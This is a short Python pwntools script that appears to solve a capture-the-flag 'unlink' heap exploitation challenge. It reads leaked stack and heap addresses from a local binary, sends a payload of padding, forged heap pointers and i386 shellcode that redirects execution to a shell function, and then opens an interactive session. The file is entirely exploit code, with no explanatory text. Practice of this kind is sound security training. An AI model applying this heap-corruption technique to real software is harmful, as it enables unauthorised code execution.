#!/usr/bin/env python3

import pwn

rem = pwn.process('./unlink')
stack_addr = int(rem.recvline().split()[5], 0)
heap_addr = int(rem.recvline().split()[5], 0)

ret_addr = stack_addr + 0x28
jmp_addr = heap_addr + 0x20
shell_func = 0x080484eb

pwn.context.arch = 'i386'
shellcode = pwn.asm('''
	jmp safe
	nop
	nop
	nop
	nop
safe:
	push 0x080484eb
	ret
''')
payload = b'A' * 16 + pwn.p32(heap_addr) + pwn.p32(stack_addr) + shellcode
pwn.pause()

rem.sendline(payload)

rem.interactive()
